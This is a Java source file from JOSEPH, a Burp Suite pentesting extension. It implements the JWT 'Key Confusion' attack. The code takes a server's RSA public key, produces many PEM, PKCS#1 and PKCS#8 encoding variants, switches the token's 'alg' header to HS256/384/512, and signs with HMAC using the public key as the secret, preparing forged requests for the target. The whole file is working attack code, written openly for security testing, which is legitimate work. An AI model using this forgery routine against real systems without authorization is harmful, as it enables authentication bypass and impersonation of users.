/**
 * JOSEPH - JavaScript Object Signing and Encryption Pentesting Helper
 * Copyright (C) 2016 Dennis Detering
 * <p>
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 * <p>
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 * <p>
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package eu.dety.burp.joseph.attacks.key_confusion;

import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import eu.dety.burp.joseph.attacks.AttackPreparationFailedException;
import eu.dety.burp.joseph.attacks.IAttackInfo;
import eu.dety.burp.joseph.utilities.*;
import org.apache.commons.codec.binary.Base64;
import org.json.simple.parser.JSONParser;

import javax.swing.*;
import java.awt.*;
import java.io.UnsupportedEncodingException;
import java.security.PublicKey;
import java.util.*;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Key Confusion Attack Info
 * <p>
 * Class holding meta data for the Key Confusion attack and for preparing all necessary parameter for the actual attack.
 * 
 * @author Dennis Detering
 * @version 1.0
 */
public class KeyConfusionInfo implements IAttackInfo {
    private static final Logger loggerInstance = Logger.getInstance();
    private static final ResourceBundle bundle = ResourceBundle.getBundle("JOSEPH");

    private IExtensionHelpers helpers;
    private IHttpRequestResponse requestResponse;
    private JoseParameter parameter;

    // Unique identifier for the attack class
    private static final String id = "key_confusion";

    // Full name of the attack
    private static final String name = "Key Confusion";

    // Attack description
    private static final String description = "<html>The <em>Key Confusion</em> attack exploits a vulnerability where a "
            + "<em>public key</em> is mistakenly used as <em>MAC secret</em>.<br/>"
            + "Such a vulnerability occurs when the endpoint expects a RSA signed token and does not correctly check the actually used or allowed algorithm.</html>";

    // Array of algorithms to test
    private static final String[] algorithms = { "HS256", "HS384", "HS512" };

    // Hashmap of public key variation to test
    private HashMap<PayloadType, String> publicKeyVariations = new HashMap<>();

    // Amount of requests needed
    private int amountRequests = 0;

    // Types of payload variation
    enum PayloadType {
        // Derived from PEM input
        ORIGINAL,
        ORIGINAL_NO_HEADER_FOOTER,
        ORIGINAL_NO_LF,
        ORIGINAL_NO_HEADER_FOOTER_LF,
        ORIGINAL_ADDITIONAL_LF,

        PKCS1,
        PKCS1_NO_HEADER_FOOTER,
        PKCS1_NO_LF,
        PKCS1_NO_HEADER_FOOTER_LF,

        // Derived from JWK input
        PKCS8,
        PKCS8_WITH_HEADER_FOOTER,
        PKCS8_WITH_LF,
        PKCS8_WITH_HEADER_FOOTER_LF,
        PKCS8_WITH_HEADER_FOOTER_LF_ENDING_LF,
    }

    // Hashmap of available payloads with a verbose name (including the PayloadType)
    private static final HashMap<String, PayloadType> payloads = new HashMap<>();
    static {
        for (PayloadType payload : PayloadType.values()) {
            payloads.put(String.format("Public key transformation %02d   (0x%02X)", payload.ordinal(), payload.ordinal()), payload);
        }
    }

    // List of prepared requests with payload info
    private List<KeyConfusionAttackRequest> requests = new ArrayList<>();

    private JComboBox<String> publicKeySelection;
    private JTextArea publicKey;

    public KeyConfusionInfo(IBurpExtenderCallbacks callbacks) {
        this.helpers = callbacks.getHelpers();
    }

    @Override
    public KeyConfusion prepareAttack(IBurpExtenderCallbacks callbacks, IHttpRequestResponse requestResponse, IRequestInfo requestInfo, JoseParameter parameter)
            throws AttackPreparationFailedException {
        this.requestResponse = requestResponse;
        this.parameter = parameter;

        this.publicKeyVariations.clear();
        this.requests.clear();

        String publicKeyValue = publicKey.getText();

        // Throw error if public key value is empty
        if (publicKeyValue.isEmpty()) {
            throw new AttackPreparationFailedException(bundle.getString("PROVIDE_PUBKEY"));
        }

        // Parse public key according to selected format
        int publicKeyFormat = publicKeySelection.getSelectedIndex();

        switch (publicKeyFormat) {
        // JWK (JSON)
            case 1:
                // TODO: Refactor to test every key at once? Requires change of HashMap key

                loggerInstance.log(getClass(), "Key format is JWK:  " + publicKeyValue, Logger.LogLevel.DEBUG);

                HashMap<String, PublicKey> publicKeys;
                PublicKey selectedPublicKey;

                try {
                    Object publickKeyValueJson = new JSONParser().parse(publicKeyValue);

                    publicKeys = Converter.getRsaPublicKeysByJwkWithId(publickKeyValueJson);
                } catch (Exception e) {
                    loggerInstance.log(getClass(), "Error in prepareAttack (JWK):  " + e.getMessage(), Logger.LogLevel.ERROR);
                    throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_JWK"));
                }

                switch (publicKeys.size()) {
                // No suitable JWK in JWK Set found
                    case 0:
                        loggerInstance.log(getClass(), "Error in prepareAttack (JWK): No suitable JWK", Logger.LogLevel.ERROR);
                        throw new AttackPreparationFailedException(bundle.getString("NO_SUITABLE_JWK"));

                        // Exactly one suitable JWK found
                    case 1:
                        selectedPublicKey = publicKeys.entrySet().iterator().next().getValue();
                        break;

                    // More than one suitable JWK found. Provide dialog to select one.
                    default:
                        selectedPublicKey = Converter.getRsaPublicKeyByJwkSelectionPanel(publicKeys);
                }

                try {
                    loggerInstance.log(getClass(), "Encoded PubKey: " + Base64.encodeBase64String(selectedPublicKey.getEncoded()) + "\nFormat: "
                            + selectedPublicKey.getFormat(), Logger.LogLevel.DEBUG);

                    // PKCS#8 / X.509
                    publicKeyVariations.put(PayloadType.PKCS8, transformKeyByPayload(PayloadType.PKCS8, selectedPublicKey));

                    // With header/footer
                    publicKeyVariations.put(PayloadType.PKCS8_WITH_HEADER_FOOTER,
                            transformKeyByPayload(PayloadType.PKCS8_WITH_HEADER_FOOTER, selectedPublicKey));

                    // With line feeds
                    publicKeyVariations.put(PayloadType.PKCS8_WITH_LF, transformKeyByPayload(PayloadType.PKCS8_WITH_LF, selectedPublicKey));

                    // With line feeds and header/footer
                    publicKeyVariations.put(PayloadType.PKCS8_WITH_HEADER_FOOTER_LF,
                            transformKeyByPayload(PayloadType.PKCS8_WITH_HEADER_FOOTER_LF, selectedPublicKey));

                    // With line feeds and header/footer and additional line feed at end
                    publicKeyVariations.put(PayloadType.PKCS8_WITH_HEADER_FOOTER_LF_ENDING_LF,
                            transformKeyByPayload(PayloadType.PKCS8_WITH_HEADER_FOOTER_LF_ENDING_LF, selectedPublicKey));

                } catch (Exception e) {
                    throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_JWK"));
                }

                break;
            // PEM (String)
            default:
                loggerInstance.log(getClass(), "Key format is PEM:  " + publicKeyValue, Logger.LogLevel.DEBUG);

                // Simple check if String has valid format
                if (!publicKeyValue.trim().startsWith("-----BEGIN") && !publicKeyValue.trim().startsWith("MI")) {
                    throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_PEM"));
                }

                try {
                    // No modification
                    publicKeyVariations.put(PayloadType.ORIGINAL, publicKeyValue);

                    // Without header/footer
                    publicKeyVariations
                            .put(PayloadType.ORIGINAL_NO_HEADER_FOOTER, transformKeyByPayload(PayloadType.ORIGINAL_NO_HEADER_FOOTER, publicKeyValue));

                    // Without line feeds/carriage returns
                    publicKeyVariations.put(PayloadType.ORIGINAL_NO_LF, transformKeyByPayload(PayloadType.ORIGINAL_NO_LF, publicKeyValue));

                    // Without header/footer and line feeds/carriage returns
                    publicKeyVariations.put(PayloadType.ORIGINAL_NO_HEADER_FOOTER_LF,
                            transformKeyByPayload(PayloadType.ORIGINAL_NO_HEADER_FOOTER_LF, publicKeyValue));

                    publicKeyVariations.put(PayloadType.ORIGINAL_ADDITIONAL_LF, transformKeyByPayload(PayloadType.ORIGINAL_ADDITIONAL_LF, publicKeyValue));

                    // PKCS#1, easy but hacky transformation
                    publicKeyVariations.put(PayloadType.PKCS1, transformKeyByPayload(PayloadType.PKCS1, publicKeyValue));

                    // PKCS#1 without header/footer
                    publicKeyVariations.put(PayloadType.PKCS1_NO_HEADER_FOOTER, transformKeyByPayload(PayloadType.PKCS1_NO_HEADER_FOOTER, publicKeyValue));

                    // PKCS#1 without line feeds/carriage returns
                    publicKeyVariations.put(PayloadType.PKCS1_NO_LF, transformKeyByPayload(PayloadType.PKCS1_NO_LF, publicKeyValue));

                    // PKCS#1 without header/footer and line feeds/carriage
                    // returns
                    publicKeyVariations
                            .put(PayloadType.PKCS1_NO_HEADER_FOOTER_LF, transformKeyByPayload(PayloadType.PKCS1_NO_HEADER_FOOTER_LF, publicKeyValue));

                } catch (Exception e) {
                    throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_PEM"));
                }

                break;
        }

        for (Map.Entry<PayloadType, String> publicKey : publicKeyVariations.entrySet()) {
            for (String algorithm : algorithms) {
                try {
                    // Change the "alg" header value for each of the algorithms
                    // entries
                    String[] components = Decoder.getComponents(this.parameter.getJoseValue());
                    String decodedHeader = Decoder.getDecoded(components[0]);
                    String decodedHeaderReplacedAlgorithm = decodedHeader.replaceFirst("\"alg\":\"(.+?)\"", "\"alg\":\"" + algorithm + "\"");
                    String encodedHeaderReplacedAlgorithm = Decoder.getEncoded(decodedHeaderReplacedAlgorithm);

                    String macAlg = Crypto.getMacAlgorithmByJoseAlgorithm(algorithm, "HmacSHA256");

                    // Generate signature
                    String newSignature = Decoder.getEncoded(Crypto.generateMac(macAlg, helpers.stringToBytes(publicKey.getValue()),
                            helpers.stringToBytes(Decoder.concatComponents(new String[] { encodedHeaderReplacedAlgorithm, components[1] }))));

                    // Build new JWS String and update parameter
                    String[] newComponents = { encodedHeaderReplacedAlgorithm, components[1], newSignature };
                    String newComponentsConcatenated = Decoder.concatComponents(newComponents);

                    byte[] tmpRequest = JoseParameter.updateRequest(this.requestResponse.getRequest(), this.parameter, helpers, newComponentsConcatenated);
                    requests.add(new KeyConfusionAttackRequest(tmpRequest, publicKey.getKey().ordinal(), algorithm, publicKey.getValue(), publicKey.getValue()
                            .length()));
                } catch (Exception e) {
                    throw new AttackPreparationFailedException("Attack preparation failed. Message: " + e.getMessage());
                }
            }
        }

        this.amountRequests = requests.size();
        return new KeyConfusion(callbacks, this);
    }

    @Override
    public String getId() {
        return id;
    }

    @Override
    public String getName() {
        return name;
    }

    @Override
    public String getDescription() {
        return description;
    }

    @Override
    public int getAmountRequests() {
        return amountRequests;
    }

    @Override
    public boolean getExtraUI(JPanel extraPanel, GridBagConstraints constraints) {
        // Create combobox and textarea to add public key (in different formats)
        JLabel publicKeyLabel = new JLabel(bundle.getString("PUBKEY_FORMAT"));
        publicKeySelection = new JComboBox<>();
        DefaultComboBoxModel<String> publicKeySelectionListModel = new DefaultComboBoxModel<>();
        publicKey = new JTextArea(10, 50);
        publicKey.setLineWrap(true);

        publicKeySelectionListModel.addElement("PEM (String)");
        publicKeySelectionListModel.addElement("JWK (JSON)");

        publicKeySelection.setModel(publicKeySelectionListModel);

        constraints.gridy = 0;
        extraPanel.add(publicKeyLabel, constraints);

        constraints.gridy = 1;
        extraPanel.add(publicKeySelection, constraints);

        constraints.gridy = 2;
        JScrollPane jScrollPane = new javax.swing.JScrollPane();
        jScrollPane.setViewportView(publicKey);
        extraPanel.add(jScrollPane, constraints);

        return true;
    }

    @Override
    public boolean isSuitable(JoseParameter.JoseType type, String algorithm) {
        return (type == JoseParameter.JoseType.JWS);
    }

    @Override
    public IHttpRequestResponse getRequestResponse() {
        return this.requestResponse;
    }

    @Override
    public List<KeyConfusionAttackRequest> getRequests() {
        return this.requests;
    }

    @Override
    public HashMap<String, PayloadType> getPayloadList() {
        return payloads;
    }

    @Override
    public HashMap<String, String> updateValuesByPayload(Enum payloadTypeId, String header, String payload, String signature)
            throws AttackPreparationFailedException {
        String publicKeyValue = publicKey.getText();
        int publicKeyFormat = publicKeySelection.getSelectedIndex();

        String modifiedKey;

        switch (publicKeyFormat) {
        // JWK (JSON)
            case 1:
                loggerInstance.log(getClass(), "Key format is JWK:  " + publicKeyValue, Logger.LogLevel.DEBUG);

                HashMap<String, PublicKey> publicKeys;
                PublicKey selectedPublicKey;

                try {
                    Object publickKeyValueJson = new JSONParser().parse(publicKeyValue);

                    publicKeys = Converter.getRsaPublicKeysByJwkWithId(publickKeyValueJson);
                } catch (Exception e) {
                    loggerInstance.log(getClass(), "Error in updateValuesByPayload (JWK):  " + e.getMessage(), Logger.LogLevel.ERROR);
                    throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_JWK"));
                }

                switch (publicKeys.size()) {
                // No suitable JWK in JWK Set found
                    case 0:
                        loggerInstance.log(getClass(), "Error in updateValuesByPayload (JWK): No suitable JWK", Logger.LogLevel.ERROR);
                        throw new AttackPreparationFailedException(bundle.getString("NO_SUITABLE_JWK"));

                        // Exactly one suitable JWK found
                    case 1:
                        selectedPublicKey = publicKeys.entrySet().iterator().next().getValue();
                        break;

                    // More than one suitable JWK found. Provide dialog to select one.
                    default:
                        selectedPublicKey = Converter.getRsaPublicKeyByJwkSelectionPanel(publicKeys);
                }

                try {
                    modifiedKey = transformKeyByPayload(payloadTypeId, selectedPublicKey);
                } catch (Exception e) {
                    loggerInstance.log(getClass(), "Error in updateValuesByPayload (JWK):  " + e.getMessage(), Logger.LogLevel.ERROR);
                    throw new AttackPreparationFailedException(bundle.getString("ATTACK_PREPARATION_FAILED"));
                }

                break;
            // PEM (String)
            default:
                loggerInstance.log(getClass(), "Key format is PEM:  " + publicKeyValue, Logger.LogLevel.DEBUG);

                // Simple check if String has valid format
                if (!publicKeyValue.trim().startsWith("-----BEGIN") && !publicKeyValue.trim().startsWith("MI")) {
                    throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_PEM"));
                }

                try {
                    modifiedKey = transformKeyByPayload(payloadTypeId, publicKeyValue);

                } catch (Exception e) {
                    loggerInstance.log(getClass(), "Error in updateValuesByPayload (PEM):  " + e.getMessage(), Logger.LogLevel.ERROR);
                    throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_PEM"));
                }

        }

        Pattern jwsPattern = Pattern.compile("\"alg\":\"(.+?)\"", Pattern.CASE_INSENSITIVE);
        Matcher jwsMatcher = jwsPattern.matcher(header);

        String algorithm = (jwsMatcher.find()) ? jwsMatcher.group(1) : "HS256";

        String macAlg = Crypto.getMacAlgorithmByJoseAlgorithm(algorithm, "HmacSHA256");

        if (!Crypto.JWS_HMAC_ALGS.contains(algorithm))
            algorithm = "HS256";

        header = header.replaceFirst("\"alg\":\"(.+?)\"", "\"alg\":\"" + algorithm + "\"");

        HashMap<String, String> result = new HashMap<>();
        result.put("header", header);
        result.put("payload", payload);
        result.put(
                "signature",
                Decoder.getEncoded(Crypto.generateMac(
                        macAlg,
                        helpers.stringToBytes(modifiedKey),
                        helpers.stringToBytes(Decoder.concatComponents(new String[] { Decoder.base64UrlEncode(helpers.stringToBytes(header)),
                                Decoder.base64UrlEncode(helpers.stringToBytes(payload)) })))));

        if (publicKeyValue.isEmpty()) {
            return result;
        }

        return result;
    }

    public String transformKeyByPayload(Enum payloadTypeId, String key) {
        String modifiedKey;

        switch ((PayloadType) payloadTypeId) {
            case ORIGINAL_NO_HEADER_FOOTER:
                modifiedKey = key.replace("-----BEGIN PUBLIC KEY-----\n", "").replaceAll("-----END PUBLIC KEY-----\\n?", "")
                        .replace("-----BEGIN RSA PUBLIC KEY-----\n", "").replaceAll("-----END RSA PUBLIC KEY-----\\n?", "");
                break;

            case ORIGINAL_NO_LF:
                modifiedKey = key.replaceAll("\\r\\n|\\r|\\n", "");
                break;

            case ORIGINAL_NO_HEADER_FOOTER_LF:
                modifiedKey = transformKeyByPayload(PayloadType.ORIGINAL_NO_LF, transformKeyByPayload(PayloadType.ORIGINAL_NO_HEADER_FOOTER, key));
                break;

            case ORIGINAL_ADDITIONAL_LF:
                modifiedKey = key + "\n";
                break;

            case PKCS1:
                modifiedKey = key.substring(32);
                break;

            case PKCS1_NO_HEADER_FOOTER:
                modifiedKey = transformKeyByPayload(PayloadType.PKCS1, transformKeyByPayload(PayloadType.ORIGINAL_NO_HEADER_FOOTER, key));
                break;

            case PKCS1_NO_LF:
                modifiedKey = transformKeyByPayload(PayloadType.PKCS1, transformKeyByPayload(PayloadType.ORIGINAL_NO_LF, key));
                break;

            case PKCS1_NO_HEADER_FOOTER_LF:
                modifiedKey = transformKeyByPayload(PayloadType.PKCS1, transformKeyByPayload(PayloadType.ORIGINAL_NO_HEADER_FOOTER_LF, key));
                break;

            case ORIGINAL:
            default:
                modifiedKey = key;
                break;

        }

        return modifiedKey;
    }

    String transformKeyByPayload(Enum payloadTypeId, PublicKey key) throws UnsupportedEncodingException {
        Base64 base64Pem = new Base64(64, "\n".getBytes("UTF-8"));

        String modifiedKey;

        switch ((PayloadType) payloadTypeId) {

            case PKCS8_WITH_HEADER_FOOTER:
                modifiedKey = "-----BEGIN PUBLIC KEY-----" + Base64.encodeBase64String(key.getEncoded()) + "-----END PUBLIC KEY-----";
                break;

            case PKCS8_WITH_LF:
                modifiedKey = base64Pem.encodeToString(key.getEncoded());
                break;

            case PKCS8_WITH_HEADER_FOOTER_LF:
                modifiedKey = "-----BEGIN PUBLIC KEY-----\n" + base64Pem.encodeToString(key.getEncoded()) + "-----END PUBLIC KEY-----";
                break;

            case PKCS8_WITH_HEADER_FOOTER_LF_ENDING_LF:
                modifiedKey = transformKeyByPayload(PayloadType.PKCS8_WITH_HEADER_FOOTER_LF, key) + "\n";
                break;

            case PKCS8:
            default:
                modifiedKey = Base64.encodeBase64String(key.getEncoded());
                break;
        }

        return modifiedKey;
    }

}
